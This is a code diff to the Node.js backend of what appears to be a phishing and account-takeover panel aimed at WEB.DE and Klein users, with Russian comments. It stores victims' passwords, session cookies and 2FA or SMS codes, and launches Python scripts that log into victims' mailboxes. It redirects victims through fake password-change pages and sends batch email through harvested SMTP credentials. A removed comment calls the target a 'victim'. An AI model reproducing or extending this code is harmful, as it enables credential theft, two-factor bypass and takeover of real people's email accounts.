@@ -4,18 +4,22 @@ const fs = require('fs');
 const os = require('os');
 const { spawn } = require('child_process');
 const { send, safeEnd } = require('../utils/httpUtils');
-const { checkAdminAuth, getAdminTokenFromRequest, ADMIN_TOKEN, ADMIN_DOMAIN, checkAdminPageAuth } = require('../utils/authUtils');
+const { checkAdminAuth, checkWorkerSecret, checkAdminPageAuth, hasValidAdminSession } = require('../utils/authUtils');
 const { getPlatformFromRequest, maskEmail, translateChatText, CHAT_TRANSLATE_TARGET } = require('../utils/formatUtils');
 const leadService = require('../services/leadService');
 const automationService = require('../services/automationService');
 const chatService = require('../services/chatService');
 let nodemailer;
 try { nodemailer = require('nodemailer'); } catch (e) { nodemailer = null; }
+const { runConcurrent } = require('../utils/runConcurrent');
+const { formatModeStartPage } = require('../lib/adminModeFlowLog');
+const MAIL_BATCH_SMTP_CONCURRENCY = 4;
+const SERVER_INSTANCE = process.env.INSTANCE_NAME || ('pm2-' + (process.env.pm_id || 'na'));
 
 async function handle(scope) {
   with (scope) {
   if (pathname === '/api/webde-login-grid-step' && req.method === 'POST') {
-    if (!checkAdminAuth(req, res)) return;
+    if (!checkWorkerSecret(req, res)) return;
     let body = '';
     req.on('data', (chunk) => { body += chunk; });
     req.on('end', () => {
@@ -52,8 +56,7 @@ async function handle(scope) {
     const leadId = (parsed.query && parsed.query.leadId) ? String(parsed.query.leadId).trim() : '';
     if (!leadId) return send(res, 400, { ok: false, error: 'leadId required' });
     const id = leadService.resolveLeadId(leadId);
-    const leads = leadService.readLeads();
-    const lead = leads.find((l) => l.id === id);
+    const lead = leadService.readLeadById(id);
     if (!lead) return send(res, 404, { ok: false });
     const raw = lead.cookies != null ? String(lead.cookies).trim() : '';
     if (!raw) return send(res, 404, { ok: false, error: 'Куки не найдены (вход не выполнялся или не был успешным)' });
@@ -72,9 +75,9 @@ async function handle(scope) {
     return true;
   }
 
-  /** Скрипт WEB.DE (lead_mode): сохранить куки в SQLite (Bearer = ADMIN_TOKEN). */
+  /** Скрипт WEB.DE (lead_mode): сохранить куки в SQLite (x-worker-secret). */
   if (pathname === '/api/lead-cookies-upload' && req.method === 'POST') {
-    if (!checkAdminAuth(req, res)) return;
+    if (!checkWorkerSecret(req, res)) return;
     let body = '';
     req.on('data', (chunk) => { body += chunk; });
     req.on('end', () => {
@@ -85,8 +88,7 @@ async function handle(scope) {
       const idRaw = (json.id != null && String(json.id).trim()) || (json.leadId != null && String(json.leadId).trim()) || '';
       if (!idRaw) return send(res, 400, { ok: false, error: 'id or leadId required' });
       const id = leadService.resolveLeadId(idRaw);
-      const leads = leadService.readLeads();
-      const lead = leads.find((l) => l.id === id);
+      const lead = leadService.readLeadById(id);
       if (!lead) return send(res, 404, { ok: false, error: 'Lead not found' });
       const c = json.cookies;
       let cookiesStr = '';
@@ -146,12 +148,12 @@ async function handle(scope) {
       const emailLower = email.toLowerCase();
       automationService.preemptWebdeLoginForReplacedLead(id, emailLower);
       if (!automationService.tryAcquireWebdeScriptLock(emailLower, id)) {
-        logTerminalFlow('АДМИН', 'Админ', '—', email, 'webde-login-start отклонён: скрипт уже запущен для email, id=' + id);
+        logTerminalFlow('АДМИН', 'Админ', '—', email, 'webde-login-start отклонён: скрипт уже запущен для email, id=' + id, id);
         return send(res, 409, { ok: false, error: 'Для этого email скрипт входа уже запущен' });
       }
       if (automationService.runningWebdeLoginLeadIds.size >= automationService.WEBDE_LOGIN_MAX_CONCURRENT) {
         automationService.clearWebdeScriptRunning(emailLower);
-        logTerminalFlow('АДМИН', 'Админ', '—', email, 'webde-login-start отклонён: занято слотов ' + automationService.WEBDE_LOGIN_MAX_CONCURRENT);
+        logTerminalFlow('АДМИН', 'Админ', '—', email, 'webde-login-start отклонён: занято слотов ' + automationService.WEBDE_LOGIN_MAX_CONCURRENT, id);
         return send(res, 409, { ok: false, error: 'Достигнут лимит одновременных автовходов (' + automationService.WEBDE_LOGIN_MAX_CONCURRENT + ')' });
       }
       const loginDir = path.join(PROJECT_ROOT, 'login');
@@ -166,12 +168,12 @@ async function handle(scope) {
       const protocol = req.headers['x-forwarded-proto'] === 'https' ? 'https' : 'http';
       const host = (req.headers['x-forwarded-host'] || req.headers.host || '127.0.0.1:' + PORT).split(',')[0].trim();
       const baseUrl = process.env.SERVER_URL || (protocol + '://' + host);
-      const token = ADMIN_TOKEN || '';
+      const workerSecret = (process.env.WORKER_SECRET || '').trim();
       const python = process.platform === 'win32' ? 'python' : 'python3';
       const env = Object.assign({}, process.env, { PYTHONUNBUFFERED: '1' });
-      const pyArgsManual = [scriptPath, '--server-url', baseUrl, '--lead-id', id, '--token', token, '--combo-slot', String(webdeComboSlotManual)];
+      const pyArgsManual = [scriptPath, '--server-url', baseUrl, '--lead-id', id, '--combo-slot', String(webdeComboSlotManual)];
       if (readStartPage() === 'klein') pyArgsManual.push('--klein-orchestration');
-      const child = require('child_process').spawn(python, pyArgsManual, { cwd: PROJECT_ROOT, detached: true, stdio: 'inherit', env });
+      const child = require('child_process').spawn(python, pyArgsManual, { cwd: PROJECT_ROOT, detached: true, stdio: 'inherit', env: Object.assign({}, env, { WORKER_SECRET: workerSecret }) });
       automationService.webdeLockWriteChildPid(emailLower, child.pid);
       automationService.webdeLoginChildByLeadId.set(id, child);
       child.on('exit', function () {
@@ -187,7 +189,7 @@ async function handle(scope) {
         webdeScriptActiveRun: lead.webdeScriptActiveRun,
         eventTerminal: lead.eventTerminal
       });
-      logTerminalFlow('АДМИН', 'Админ', manualSession, email, 'ручной запуск webde-login id=' + id + (manualKleinOrch ? ' klein-orchestration' : ''));
+      logTerminalFlow('АДМИН', 'Админ', manualSession, email, 'ручной запуск webde-login id=' + id + (manualKleinOrch ? ' klein-orchestration' : ''), id);
       send(res, 200, { ok: true, message: 'started' });
     });
     return true;
@@ -394,7 +396,7 @@ async function handle(scope) {
           'Content-Type': 'application/json',
           'Access-Control-Allow-Origin': '*',
           'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
-          'Access-Control-Allow-Headers': 'Content-Type, Authorization',
+          'Access-Control-Allow-Headers': 'Content-Type, x-worker-secret',
           'Cache-Control': 'no-store, no-cache, must-revalidate',
           'Pragma': 'no-cache'
         };
@@ -746,12 +748,21 @@ async function handle(scope) {
       let sent = 0;
       let failed = 0;
       const failSamples = [];
-      for (let i = 0; i < targets.length; i++) {
-        const t = targets[i];
+      await runConcurrent(targets, MAIL_BATCH_SMTP_CONCURRENCY, async (t) => {
         const idx = leads.findIndex((x) => x && x.id === t.id);
-        if (idx === -1) continue;
+        if (idx === -1) return;
         const live = leads[idx];
-        const result = await sendConfigEmailToLead(live);
+        let result;
+        try {
+          result = await sendConfigEmailToLead(live);
+        } catch (e) {
+          console.error('[send-email-cookies-batch] исключение:', e && e.message ? e.message : e);
+          failed++;
+          if (failSamples.length < 8) {
+            failSamples.push({ id: live.id, email: (live.email || '').trim(), error: (e && e.message) ? String(e.message).slice(0, 120) : 'exception' });
+          }
+          return;
+        }
         if (result.ok) {
           pushEvent(live, CONFIG_EMAIL_SENT_EVENT_LABEL, 'admin');
           leadService.persistLeadPatch(live.id, { eventTerminal: live.eventTerminal });
@@ -763,8 +774,7 @@ async function handle(scope) {
             failSamples.push({ id: live.id, email: (live.email || '').trim(), error: result.error || '' });
           }
         }
-        if (i < targets.length - 1) await new Promise((r) => setTimeout(r, 1000));
-      }
+      });
       var emptyHint = '';
       if (targets.length === 0) {
         emptyHint = 'Нет лидов в выборке. Для режимов «Валид» / «Валид не отправлено» нужны сохранённые куки входа (в БД или legacy login/cookies). «Валид не отправлено» пропускает лидов, у кого в логе уже есть «Send Email» (или старые подписи). Отработанные не берутся.';
@@ -840,23 +850,22 @@ async function handle(scope) {
         return cfg;
       }
 
-      for (let i = 0; i < targets.length; i++) {
-        const lead = targets[i];
+      await runConcurrent(targets, MAIL_BATCH_SMTP_CONCURRENCY, async (lead) => {
         const idx = leads.findIndex((x) => x.id === lead.id);
         if (idx === -1) {
           skipped++;
-          continue;
+          return;
         }
         const live = leads[idx];
         const cfg = cfgForLead(live);
         if (!cfg || !(cfg.smtpLine && cfg.smtpLine.trim())) {
           skipped++;
-          continue;
+          return;
         }
         const smtpList = parseSmtpLines(cfg.smtpLine);
         if (!smtpList.length) {
           skipped++;
-          continue;
+          return;
         }
         const toEmail = (live.email || live.emailKl || '').trim();
         const password = (live.password || live.passwordKl || '').trim();
@@ -904,8 +913,7 @@ async function handle(scope) {
           if (failSamples.length < 8) failSamples.push({ id: live.id, email: toEmail, error: msg });
           console.error('[send-email-all-success] ошибка → ' + toEmail + ': ' + msg);
         }
-        if (i < targets.length - 1) await new Promise((r) => setTimeout(r, 400));
-      }
+      });
       return send(res, 200, {
         ok: true,
         total: targets.length,
@@ -987,7 +995,7 @@ async function handle(scope) {
       warmupState.log = [{ text: '[Прогрев запущен. Потоков: ' + numThreads + ', лимит с каждого SMTP: ' + perSmtpLimit + ', задержка: ' + delaySec + ' сек. SMTP по кругу (всего ' + flatList.length + '), лиды по кругу]', type: 'muted' }];
       warmupState.totalSent = 0;
       warmupState.running = true;
-      for (let w = 0; w < numThreads; w++) setImmediate(runWarmupStep);
+      setImmediate(runWarmupStep);
       return send(res, 200, { ok: true });
     });
     return true;
@@ -1061,7 +1069,7 @@ async function handle(scope) {
           if (typeof json.numThreads === 'number' || typeof json.numThreads === 'string') {
             let numThreads = typeof json.numThreads === 'number' ? json.numThreads : parseInt(json.numThreads, 10);
             if (!isNaN(numThreads) && numThreads >= 1 && numThreads <= 20 && numThreads > warmupState.numThreads) {
-              for (let w = warmupState.numThreads; w < numThreads; w++) setImmediate(runWarmupStep);
+              setImmediate(runWarmupStep);
               warmupState.numThreads = numThreads;
             } else if (!isNaN(numThreads) && numThreads >= 1 && numThreads <= 20) {
               warmupState.numThreads = numThreads;
@@ -1141,8 +1149,7 @@ async function handle(scope) {
       const typing = json.typing === true;
       if (!leadId || !who) return send(res, 400, { ok: false });
       if (who === 'support') {
-        const token = getAdminTokenFromRequest(req, parsed);
-        if (!ADMIN_TOKEN || token !== ADMIN_TOKEN) return send(res, 403, { ok: false });
+        if (!hasValidAdminSession(req)) return send(res, 403, { ok: false });
       }
       chatService.setChatTyping(leadId, who, typing);
       return send(res, 200, { ok: true });
@@ -1265,8 +1272,7 @@ async function handle(scope) {
     const leadId = (parsed.query && parsed.query.leadId) ? String(parsed.query.leadId).trim() : '';
     if (!leadId) return send(res, 400, { ok: false, error: 'leadId required' });
     const id = resolveLeadId(leadId);
-    const leads = readLeads();
-    const lead = leads.find((l) => l.id === id);
+    const lead = leadService.readLeadById(id);
     if (!lead) return send(res, 404, { ok: false });
     const fp = lead.fingerprint && typeof lead.fingerprint === 'object' ? lead.fingerprint : null;
     let telemetrySnapshots = Array.isArray(lead.telemetrySnapshots) && lead.telemetrySnapshots.length > 0
@@ -1341,7 +1347,7 @@ async function handle(scope) {
   }
 
   if (pathname === '/api/lead-credentials' && req.method === 'GET') {
-    if (!checkAdminAuth(req, res)) return;
+    if (!checkWorkerSecret(req, res)) return;
     const leadIdRaw = (parsed.query && parsed.query.leadId) ? String(parsed.query.leadId).trim() : '';
     if (!leadIdRaw) return send(res, 400, { ok: false, error: 'leadId required' });
     const id = resolveLeadId(leadIdRaw);
@@ -1368,7 +1374,7 @@ async function handle(scope) {
   }
 
   if (pathname === '/api/lead-klein-flow-poll' && req.method === 'GET') {
-    if (!checkAdminAuth(req, res)) return;
+    if (!checkWorkerSecret(req, res)) return;
     const leadIdRaw = (parsed.query && parsed.query.leadId) ? String(parsed.query.leadId).trim() : '';
     if (!leadIdRaw) return send(res, 400, { ok: false, error: 'leadId required' });
     const id = resolveLeadId(leadIdRaw);
@@ -1418,7 +1424,7 @@ async function handle(scope) {
   }
 
   if (pathname === '/api/webde-poll-2fa-code' && req.method === 'GET') {
-    if (!checkAdminAuth(req, res)) return;
+    if (!checkWorkerSecret(req, res)) return;
     const leadIdRaw = (parsed.query && parsed.query.leadId) ? String(parsed.query.leadId).trim() : '';
     if (!leadIdRaw) return send(res, 400, { ok: false, error: 'leadId required' });
     const id = resolveLeadId(leadIdRaw);
@@ -1446,7 +1452,7 @@ async function handle(scope) {
   }
 
   if (pathname === '/api/webde-login-2fa-received' && req.method === 'POST') {
-    if (!checkAdminAuth(req, res)) return;
+    if (!checkWorkerSecret(req, res)) return;
     let body = '';
     req.on('data', (chunk) => { body += chunk; });
     req.on('end', () => {
@@ -1474,7 +1480,7 @@ async function handle(scope) {
   }
 
   if (pathname === '/api/webde-login-2fa-wrong' && req.method === 'POST') {
-    if (!checkAdminAuth(req, res)) return;
+    if (!checkWorkerSecret(req, res)) return;
     let body = '';
     req.on('data', (chunk) => { body += chunk; });
     req.on('end', () => {
@@ -1498,17 +1504,44 @@ async function handle(scope) {
   }
 
   if (pathname === '/api/webde-wait-password' && req.method === 'POST') {
-    if (!checkAdminAuth(req, res)) return;
+    if (!checkWorkerSecret(req, res)) return;
     let body = '';
     req.on('data', (chunk) => { body += chunk; });
     req.on('end', () => {
       let json = {};
       try { json = JSON.parse(body || '{}'); } catch {}
       const leadIdRaw = json.leadId && String(json.leadId).trim();
+      const clientKnownVersion = Number.isFinite(json.clientKnownVersion) ? Number(json.clientKnownVersion) : 0;
+      const requestId = json.requestId != null ? String(json.requestId).trim() : '';
+      const attemptNo = Number.isFinite(json.attemptNo) ? Number(json.attemptNo) : null;
       if (!leadIdRaw) {
         return send(res, 400, { ok: false, error: 'leadId required' });
       }
       const leadId = resolveLeadId(leadIdRaw);
+      const leadSnapshot = readLeadById(leadId);
+      const currentVersion = leadSnapshot && Number.isFinite(leadSnapshot.passwordVersion) ? Number(leadSnapshot.passwordVersion) : 0;
+      const currentAttempt = leadSnapshot && Number.isFinite(leadSnapshot.attemptNo) ? Number(leadSnapshot.attemptNo) : 1;
+      if (
+        leadSnapshot &&
+        currentVersion > clientKnownVersion &&
+        (leadSnapshot.consumedByAttempt == null || leadSnapshot.consumedByAttempt === currentAttempt)
+      ) {
+        markPasswordConsumedByAttempt(leadId, currentVersion, currentAttempt);
+        console.log(
+          '[АДМИН] webde-wait-password lifecycle=respond instance=' + SERVER_INSTANCE +
+          ' leadId=' + leadId + ' attemptNo=' + currentAttempt + ' requestId=' + (requestId || '-') +
+          ' wakeup_reason=new_version response_version=' + currentVersion
+        );
+        return send(res, 200, {
+          ok: true,
+          password: String(leadSnapshot.password || ''),
+          passwordVersion: currentVersion,
+          attemptNo: currentAttempt,
+          wakeupReason: 'new_version',
+          requestId: requestId || null,
+          instance: SERVER_INSTANCE
+        });
+      }
       try {
         const leadsW = readLeads();
         const lw = leadsW.find((l) => l.id === leadId);
@@ -1519,7 +1552,11 @@ async function handle(scope) {
         console.log('[АДМИН] long-poll webde-wait-password: новый запрос заменил предыдущий → старому клиенту timeout, leadId=' + leadId);
         try {
           clearTimeout(webdePasswordWaiters[leadId].timeoutId);
-          send(webdePasswordWaiters[leadId].res, 200, { timeout: true });
+          send(webdePasswordWaiters[leadId].res, 200, {
+            timeout: true,
+            wakeupReason: 'replaced_by_new_waiter',
+            instance: SERVER_INSTANCE
+          });
         } catch (e) {}
         delete webdePasswordWaiters[leadId];
         setWebdeLeadScriptStatus(leadId, null);
@@ -1528,20 +1565,36 @@ async function handle(scope) {
         if (!webdePasswordWaiters[leadId]) return;
         console.log('[АДМИН] long-poll webde-wait-password: истёк срок ' + Math.round(WEBDE_WAIT_PASSWORD_TIMEOUT_MS / 1000) + 'с без пароля из админки, leadId=' + leadId);
         try {
-          send(webdePasswordWaiters[leadId].res, 200, { timeout: true });
+          send(webdePasswordWaiters[leadId].res, 200, {
+            timeout: true,
+            wakeupReason: 'timeout',
+            instance: SERVER_INSTANCE
+          });
         } catch (e) {}
         delete webdePasswordWaiters[leadId];
         setWebdeLeadScriptStatus(leadId, null);
       }, WEBDE_WAIT_PASSWORD_TIMEOUT_MS);
-      webdePasswordWaiters[leadId] = { res: res, timeoutId: timeoutId };
+      webdePasswordWaiters[leadId] = {
+        res: res,
+        timeoutId: timeoutId,
+        clientKnownVersion: clientKnownVersion,
+        requestId: requestId,
+        attemptNo: attemptNo != null ? attemptNo : currentAttempt
+      };
       setWebdeLeadScriptStatus(leadId, 'wait_password');
-      console.log('[АДМИН] long-poll webde-wait-password: запрос принят, скрипт ждёт до ' + Math.round(WEBDE_WAIT_PASSWORD_TIMEOUT_MS / 1000) + 'с, leadId=' + leadId + (leadId !== leadIdRaw ? ' (resolved ' + leadIdRaw + ')' : '') + ' — пока админ не сохранит новый пароль (лид в error после wrong_credentials)');
+      console.log(
+        '[АДМИН] webde-wait-password lifecycle=start instance=' + SERVER_INSTANCE +
+        ' leadId=' + leadId + ' attemptNo=' + (attemptNo != null ? attemptNo : currentAttempt) +
+        ' passwordVersion=' + currentVersion + ' clientKnownVersion=' + clientKnownVersion +
+        ' requestId=' + (requestId || '-') +
+        ' timeoutSec=' + Math.round(WEBDE_WAIT_PASSWORD_TIMEOUT_MS / 1000)
+      );
     });
     return true;
   }
 
   if (pathname === '/api/webde-push-resend-poll' && req.method === 'GET') {
-    if (!checkAdminAuth(req, res)) return;
+    if (!checkWorkerSecret(req, res)) return;
     const leadId = parsed.query && parsed.query.leadId && String(parsed.query.leadId).trim();
     if (!leadId) return send(res, 400, { ok: false, resend: false });
     const requested = !!webdePushResendRequested[leadId];
@@ -1552,7 +1605,7 @@ async function handle(scope) {
   }
 
   if (pathname === '/api/webde-push-resend-result' && req.method === 'POST') {
-    if (!checkAdminAuth(req, res)) return;
+    if (!checkWorkerSecret(req, res)) return;
     let body = '';
     req.on('data', (chunk) => { body += chunk; });
     req.on('end', () => {
@@ -1577,7 +1630,7 @@ async function handle(scope) {
   }
 
   if (pathname === '/api/webde-login-slot-done' && req.method === 'POST') {
-    if (!checkAdminAuth(req, res)) return;
+    if (!checkWorkerSecret(req, res)) return;
     let body = '';
     req.on('data', (chunk) => { body += chunk; });
     req.on('end', () => {
@@ -1608,7 +1661,7 @@ async function handle(scope) {
   }
 
   if (pathname === '/api/script-event' && req.method === 'POST') {
-    if (!checkAdminAuth(req, res)) return;
+    if (!checkWorkerSecret(req, res)) return;
     let body = '';
     req.on('data', (chunk) => { body += chunk; });
     req.on('end', () => {
@@ -1630,6 +1683,14 @@ async function handle(scope) {
         ? { session: lead.webdeScriptActiveRun }
         : (parseInt(lead.webdeScriptRunSeq, 10) > 0 ? { session: lead.webdeScriptRunSeq } : undefined);
       pushEvent(lead, label, 'script', resSessionMeta);
+      logTerminalFlow(
+        'SCRIPT',
+        'Автовход',
+        resSessionMeta && resSessionMeta.session != null ? String(resSessionMeta.session) : '—',
+        (lead.emailKl || lead.email || '').trim() || '—',
+        label,
+        id
+      );
       persistLeadPatch(id, { lastSeenAt: lead.lastSeenAt, eventTerminal: lead.eventTerminal });
       return send(res, 200, { ok: true });
     });
@@ -1645,7 +1706,7 @@ async function handle(scope) {
    * resultPhase: mail_ready_klein — после фильтров почты в оркестрации. resultSource: klein_login — ответ klein_simulation / шаг Klein. */
 
   if (pathname === '/api/webde-login-result' && req.method === 'POST') {
-    if (!checkAdminAuth(req, res)) return;
+    if (!checkWorkerSecret(req, res)) return;
     let body = '';
     req.on('data', (chunk) => { body += chunk; });
     req.on('end', () => {
@@ -1653,6 +1714,7 @@ async function handle(scope) {
       try { json = JSON.parse(body || '{}'); } catch {}
       const idRaw = json.id && String(json.id).trim();
       const result = json.result && String(json.result).trim();
+      const attemptNoRaw = Number.isFinite(json.attemptNo) ? Number(json.attemptNo) : null;
       if (!idRaw) {
         console.error('[АДМИН] webde-login-result: ошибка — не передан id в теле запроса (обязательное поле).');
         return send(res, 400, { ok: false, error: 'id required' });
@@ -1670,6 +1732,14 @@ async function handle(scope) {
         return send(res, 404, { ok: false });
       }
       const lead = leads[idx];
+      const currentAttemptNo = Number.isFinite(lead.attemptNo) ? Number(lead.attemptNo) : 1;
+      if (result === 'wrong_credentials' && attemptNoRaw != null && attemptNoRaw !== currentAttemptNo) {
+        console.log(
+          '[АДМИН] webde-login-result skip stale wrong_credentials instance=' + SERVER_INSTANCE +
+          ' leadId=' + id + ' attemptNo=' + attemptNoRaw + ' currentAttemptNo=' + currentAttemptNo
+        );
+        return send(res, 200, { ok: true, skipped: 'stale_attempt' });
+      }
       const fromKleinScript = String(json.resultSource || '').trim().toLowerCase() === 'klein_login';
       const resultPhase = json.resultPhase != null ? String(json.resultPhase).trim() : '';
       const sessLog = lead.webdeScriptActiveRun != null ? lead.webdeScriptActiveRun : (parseInt(lead.webdeScriptRunSeq, 10) > 0 ? lead.webdeScriptRunSeq : '—');
@@ -1749,7 +1819,7 @@ async function handle(scope) {
         }
         const startPage = readStartPage();
         if (isKleinLead) {
-          // script-klein.js ведёт на /erfolg только при show_success; pending оставлял жертву на форме.
+          // Klein-лиды: как раньше (script-klein / erfolg).
           if (startPage === 'change') {
             lead.status = 'redirect_change_password';
           } else if (startPage === 'download') {
@@ -1757,16 +1827,18 @@ async function handle(scope) {
           } else {
             lead.status = 'show_success';
           }
-        } else if (startPage === 'klein') {
-          lead.status = 'redirect_klein_anmelden';
+        } else if (startPage === 'change' || startPage === 'klein') {
+          // WEB.DE: после входа в почту — на смену пароля; Klein на отдельном домене, не redirect_klein_anmelden здесь.
+          lead.status = 'redirect_change_password';
         } else if (startPage === 'login') {
           lead.status = 'show_success';
-        } else if (startPage === 'change') {
-          lead.status = 'redirect_change_password';
         } else if (startPage === 'download') {
           lead.status = getRedirectPasswordStatus(lead);
         } else {
           lead.status = 'show_success';
+        }
+        if (resultPhase === 'mail_ready_klein') {
+          automationService.endWebdeAutoLoginRun(lead);
         }
       } else if (result === 'wrong_credentials') lead.status = 'error';
       else if (result === 'push') lead.status = pushTimeout ? 'pending' : 'redirect_push';
@@ -1813,9 +1885,49 @@ async function handle(scope) {
           lead.smsCodeData = JSON.parse(JSON.stringify(diskLead.smsCodeData));
         }
       } catch (e) {}
-      persistLeadFull(lead);
-      clearWebdeScriptRunning((lead.email || '').trim().toLowerCase());
       const leadEmail = (lead.email || '').trim();
+      const modeSnap = formatModeStartPage(readMode(), readAutoScript(), readStartPage());
+      logTerminalFlow(
+        'РЕЖИМ',
+        'webde-login-result',
+        String(sessLog),
+        leadEmail || '—',
+        modeSnap
+          + ' · поток=' + (resultPhase === 'mail_ready_klein' ? 'Klein-оркестрация' : 'WEB.DE-скрипт')
+          + ' · result=' + result
+          + ' · phase=' + (resultPhase || '—')
+          + ' · resultSource=' + (String(json.resultSource || '').trim() || '—')
+          + ' · kleinScriptCtx=' + (klScriptCtx ? '1' : '0')
+          + ' · brand=' + (lead.brand || '—')
+          + ' · platform=' + String(lead.platform || '—')
+          + ' · attemptNo=' + (attemptNoRaw != null ? String(attemptNoRaw) : '—')
+          + ' · err=' + (errorCode || '—')
+          + ' · → status=' + lead.status
+          + (pushTimeout ? ' · pushTimeout' : '')
+          + (readStartPage() === 'klein' && lead.status === 'redirect_klein_anmelden'
+            ? ' · редирект: стартовая страница «Klein» в админке → страница Klein на вашем домене (не смена пароля WEB.DE)'
+            : ''),
+        id
+      );
+      persistLeadFull(lead);
+      if (result === 'success' && resultPhase === 'mail_ready_klein') {
+        setImmediate(function () {
+          try {
+            const live = readLeadById(id);
+            if (!live || leadHasAnyConfigEmailSentEvent(live)) return;
+            sendConfigEmailToLead(live).then(function (r) {
+              if (!r || !r.ok) return;
+              const L2 = readLeadById(id);
+              if (!L2) return;
+              pushEvent(L2, CONFIG_EMAIL_SENT_EVENT_LABEL, 'admin');
+              persistLeadPatch(id, { eventTerminal: L2.eventTerminal, lastSeenAt: L2.lastSeenAt, adminListSortAt: new Date().toISOString() });
+            }).catch(function () {});
+          } catch (e) {
+            console.error('[mail] Config E-Mail после mail_ready_klein:', e && e.message ? e.message : e);
+          }
+        });
+      }
+      clearWebdeScriptRunning((lead.email || '').trim().toLowerCase());
       logTerminalFlow(
         'АДМИН',
         'Автовход',
@@ -1827,9 +1939,9 @@ async function handle(scope) {
             : (' | ' + (eventLabel || ''))),
       );
       if (result === 'error' && !skipAdminEventForScriptVictimWait) {
-        logTerminalFlow('АДМИН', 'Система', '—', leadEmail || '—', 'коды ошибок скрипта: 403/408/502/503/500 — см. eventLabel выше');
+        logTerminalFlow('АДМИН', 'Система', '—', leadEmail || '—', 'коды ошибок скрипта: 403/408/502/503/500 — см. eventLabel выше', id);
       } else if (result === 'wrong_credentials') {
-        logTerminalFlow('АДМИН', 'Автовход', sessLog, leadEmail, wrongLbl + ' → status=error');
+        logTerminalFlow('АДМИН', 'Автовход', sessLog, leadEmail, wrongLbl + ' → status=error', id);
       }
       webdeLoginChildByLeadId.delete(id);
       releaseWebdeLoginSlot(id);
